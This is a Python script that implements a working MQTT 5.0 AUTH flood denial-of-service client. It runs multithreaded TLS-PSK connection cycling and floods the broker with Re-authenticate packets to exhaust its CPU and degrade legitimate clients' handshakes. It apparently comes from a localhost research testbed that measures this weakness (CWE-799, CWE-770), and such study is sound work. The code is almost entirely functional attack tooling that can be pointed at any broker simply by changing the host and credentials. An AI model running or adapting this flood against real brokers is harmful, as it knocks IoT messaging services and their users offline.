"""
MQTT 5.0 AUTH Flood Attack Client (VULNERABLE — No Protection)

Exploits MQTT 5.0's Enhanced Authentication mechanism to flood the broker
with rapid TLS connection cycling and AUTH (Re-authenticate) packets.
The client never completes authentication properly, forcing the broker
to continuously process:
  - TLS handshakes (CPU-intensive public-key / PSK crypto)
  - MQTT CONNECT parsing + CONNACK generation
  - AUTH packet parsing + error handling + DISCONNECT generation

Attack flow per thread (looped for ATTACK_DURATION seconds):
  1. Open TLS-PSK connection
  2. Send MQTT 5.0 CONNECT (clean start, no extended auth method)
  3. Receive CONNACK (connected successfully)
  4. Immediately flood AUTH Re-authenticate packets (reason 0x19)
  5. Broker processes each AUTH, eventually disconnects us
  6. Reconnect instantly and repeat

The flood across FLOOD_THREADS concurrent threads causes:
  - Broker CPU spikes (sustained near 100 %)
  - Legitimate client handshake latency degrades significantly
  - Broker memory grows from transient connection state

CWE-799: Improper Control of Interaction Frequency
CWE-770: Allocation of Resources Without Limits or Throttling
"""

import socket
import ssl
import struct
import threading
import time
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))
from experiments.common.measurement import TLSHandshakeMeasurer

BROKER = "localhost"
PORT = 8883
PSK_ID = "client1"
PSK_KEY = "0123456789abcdef"

# Attack parameters
FLOOD_THREADS = 10           # Concurrent attack threads
ATTACK_DURATION = 5          # Seconds of flooding per iteration
AUTH_PACKETS_PER_CONN = 50   # AUTH packets attempted per connection cycle


# ── MQTT 5.0 packet builders ────────────────────────────────────────────

def encode_varint(n):
    """Encode MQTT variable-length integer."""
    result = bytearray()
    while True:
        byte = n % 128
        n //= 128
        if n > 0:
            byte |= 0x80
        result.append(byte)
        if n == 0:
            break
    return bytes(result)


def build_mqtt5_connect(client_id):
    """Build a minimal MQTT 5.0 CONNECT packet (no auth method)."""
    var_header = b'\x00\x04MQTT'   # Protocol Name
    var_header += b'\x05'           # Protocol Version (5)
    var_header += b'\x02'           # Connect Flags: Clean Start
    var_header += b'\x00\x3c'       # Keep Alive: 60 s
    var_header += b'\x00'           # Properties Length: 0

    cid = client_id.encode('utf-8')
    payload = struct.pack('!H', len(cid)) + cid

    remaining = var_header + payload
    return b'\x10' + encode_varint(len(remaining)) + remaining


def build_mqtt5_auth(auth_method="SCRAM-SHA-256",
                     auth_data=b"flood-data-placeholder"):
    """
    Build an MQTT 5.0 AUTH packet (Re-authenticate, reason 0x19).

    Even though Mosquitto does not support enhanced auth, the broker
    must still parse the packet before responding with DISCONNECT.
    """
    method_bytes = auth_method.encode('utf-8')

    # Properties: AuthenticationMethod (0x15) + AuthenticationData (0x16)
    props = b'\x15' + struct.pack('!H', len(method_bytes)) + method_bytes
    props += b'\x16' + struct.pack('!H', len(auth_data)) + auth_data
    props_len = encode_varint(len(props))

    # Variable header: Reason Code + Properties
    var_header = b'\x19' + props_len + props        # 0x19 = Re-authenticate

    # Fixed header: AUTH = 0xF0
    return b'\xf0' + encode_varint(len(var_header)) + var_header


# ── TLS / stats helpers ─────────────────────────────────────────────────

def create_psk_context():
    """Create a TLS-PSK context for attack connections."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_psk_client_callback(
        lambda hint: (PSK_ID.encode(), bytes.fromhex(PSK_KEY))
    )
    return ctx


class FloodStats:
    """Thread-safe accumulator for flood statistics."""
    def __init__(self):
        self._lock = threading.Lock()
        self.total_conns = 0
        self.total_attempts = 0
        self.total_auths = 0

    def add(self, conns, attempts, auths):
        with self._lock:
            self.total_conns += conns
            self.total_attempts += attempts
            self.total_auths += auths


# ── Flood worker ─────────────────────────────────────────────────────────

def flood_worker(worker_id, stop_event, stats):
    """
    Flood worker thread.

    Rapidly cycles: TLS connect → CONNECT → AUTH flood → close → repeat.
    Each cycle forces the broker to do expensive TLS + MQTT processing.
    """
    local_conns = 0
    local_attempts = 0
    local_auths = 0
    ctx = create_psk_context()
    connect_pkt = build_mqtt5_connect(f"flood-{worker_id}")
    auth_pkt = build_mqtt5_auth()

    while not stop_event.is_set():
        local_attempts += 1
        try:
            # 1. TCP + TLS handshake
            raw = socket.create_connection((BROKER, PORT), timeout=3)
            tls = ctx.wrap_socket(raw, server_hostname=BROKER)
            local_conns += 1

            # 2. Send MQTT 5.0 CONNECT
            tls.sendall(connect_pkt)

            # 3. Read CONNACK (non-blocking, just drain)
            try:
                tls.settimeout(0.5)
                tls.recv(128)
            except socket.timeout:
                pass

            # 4. Flood AUTH Re-authenticate packets
            for _ in range(AUTH_PACKETS_PER_CONN):
                if stop_event.is_set():
                    break
                try:
                    tls.sendall(auth_pkt)
                    local_auths += 1
                except (BrokenPipeError, ConnectionResetError,
                        ssl.SSLError, OSError):
                    break   # broker closed connection

            # 5. Close — no clean DISCONNECT
            try:
                tls.close()
            except Exception:
                pass

        except (ConnectionRefusedError, ConnectionResetError,
                socket.timeout, ssl.SSLError, OSError):
            time.sleep(0.005)          # tiny back-off on failure

    stats.add(local_conns, local_attempts, local_auths)


# ── Legitimate client measurement ────────────────────────────────────────

def measure_legit_handshake():
    """
    Measure a legitimate client's TLS-PSK handshake latency
    while the flood is active.  Returns (latency_ms, success).
    """
    measurer = TLSHandshakeMeasurer(BROKER, PORT)
    try:
        latency = measurer.measure_psk_handshake(PSK_ID, PSK_KEY)
        return latency, 1
    except Exception:
        return -1.0, 0


# ── Main ─────────────────────────────────────────────────────────────────

def main():
    iteration = int(sys.argv[1]) if len(sys.argv) > 1 else 1

    stats = FloodStats()
    stop_event = threading.Event()

    # Launch flood threads
    threads = []
    for i in range(FLOOD_THREADS):
        t = threading.Thread(
            target=flood_worker,
            args=(f"{iteration}-{i}", stop_event, stats),
            daemon=True,
        )
        t.start()
        threads.append(t)

    # Wait for flood to establish, measure legit latency mid-attack
    time.sleep(ATTACK_DURATION * 0.4)
    legit_latency, legit_success = measure_legit_handshake()
    time.sleep(ATTACK_DURATION * 0.6)

    # Stop flood
    stop_event.set()
    for t in threads:
        t.join(timeout=5)

    # Output: flood_conns, flood_attempts, auth_packets_sent, legit_latency_ms, legit_success
    print(f"{stats.total_conns},{stats.total_attempts},{stats.total_auths},"
          f"{legit_latency:.3f},{legit_success}")


if __name__ == "__main__":
    main()
